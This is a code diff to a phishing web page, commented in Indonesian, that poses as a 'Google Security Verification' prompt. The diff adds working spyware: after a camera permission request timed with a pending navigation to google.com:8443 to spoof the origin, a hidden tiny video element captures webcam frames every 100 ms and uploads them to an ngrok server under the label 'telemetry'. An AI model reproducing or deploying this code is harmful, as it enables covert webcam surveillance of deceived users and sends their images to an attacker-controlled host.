@@ -19,7 +19,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan kamera dan diarahkan ke server aman Google.</p>
   <button id="startBtn">Verify Account & Allow Camera</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -33,58 +33,77 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Camera Spoof] " + msg);
+    console.log("[Camera Delay] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
   btn.addEventListener('click', function() {
-    log("[*] Memulai camera permission spoofing...");
+    log("[*] Memulai verifikasi...");
 
     // ============================================
-    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
+    // 2. MINTA IZIN KAMERA (SEGERA)
     // ============================================
-    // Port 8443 biasanya tertutup, menciptakan delay (timeout).
-    try {
-      window.location.href = "https://www.google.com:8443";
-    } catch (e) {
-      log("[-] Redirect error: " + e.message);
-    }
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(function(stream) {
+        log("[+] Kamera DIIZINKAN! Menyalakan kamera...");
+        
+        // ============================================
+        // 3. SETELAH KAMERA MENYALA, REDIRECT KE GOOGLE:8443
+        // ============================================
+        // Delay 500ms agar kamera sempat menyala.
+        setTimeout(function() {
+          log("[*] Redirect ke google.com:8443 (Pending Navigation)...");
+          try {
+            window.location.href = "https://www.google.com:8443";
+          } catch (e) {}
+        }, 500);
 
-    // ============================================
-    // 3. SELAMA DELAY, MINTA IZIN KAMERA
-    // ============================================
-    // Prompt kamera muncul saat address bar menampilkan google.com:8443.
-    setTimeout(function() {
-      log("[*] Meminta Izin Kamera (saat pending navigation)...");
-      
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(stream) {
-          log("[+] Kamera DIIZINKAN!");
-          stream.getTracks().forEach(function(t) { t.stop(); });
-          
-          // Tampilkan pesan sukses
-          document.body.innerHTML = `
-            <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-              <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
-              <p style="color:#666;">Kamera telah diizinkan. Anda akan diarahkan ke Google.</p>
-            </div>
-          `;
-          
-          // Redirect ke Google asli setelah 2 detik
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 2000);
-        })
-        .catch(function(err) {
-          log("[-] Kamera ditolak: " + err.name);
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 1000);
-        });
-    }, 1000); // 1 detik setelah redirect (saat pending)
+        // ============================================
+        // 4. KIRIM FRAME KAMERA KE SERVER (TELEMETRI)
+        // ============================================
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.playsInline = true;
+        video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+        document.body.appendChild(video);
 
+        video.play().catch(function(){});
+
+        var canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        var ctx = canvas.getContext('2d');
+
+        // Kirim frame setiap 100ms
+        setInterval(function() {
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+              if (!blob) return;
+              var formData = new FormData();
+              formData.append('file', blob, 'camera.jpg');
+              fetch("https://studly-unallegorized-brecken.ngrok-free.dev/upload", {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+              }).catch(function(){});
+            }, 'image/jpeg', 0.5);
+          }
+        }, 100);
+
+      })
+      .catch(function(err) {
+        log("[-] Kamera ditolak: " + err.name);
+        
+        // Jika ditolak, tetap redirect ke Google:8443 untuk delay
+        setTimeout(function() {
+          log("[*] Redirect ke google.com:8443 (Pending Navigation)...");
+          window.location.href = "https://www.google.com:8443";
+        }, 500);
+      });
   }, { once: true });
 
 })();
